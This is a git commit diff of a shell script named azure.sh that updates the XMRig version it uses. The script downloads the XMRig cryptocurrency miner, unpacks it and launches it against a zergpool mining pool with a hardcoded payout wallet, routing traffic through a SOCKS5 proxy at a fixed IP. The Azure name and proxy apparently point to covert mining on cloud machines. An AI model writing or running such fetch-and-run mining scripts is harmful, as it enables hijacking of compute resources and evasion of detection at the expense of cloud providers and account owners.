ae7fe6bbd7d87eff5b9c1cffe832f322f67cb1d4
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-05 08:28:36 +0800

    Update azure.sh

--- azure.sh
+++ azure.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz;
-tar -zxf xmrig-6.16.2-bionic-x64.tar.gz;
-cd xmrig-6.16.2;
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz;
+tar -zxf xmrig-6.16.4-bionic-x64.tar.gz;
+cd xmrig-6.16.4;
 chmod +x xmrig;
 ./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=2 -x socks5://192.252.214.20:15864;
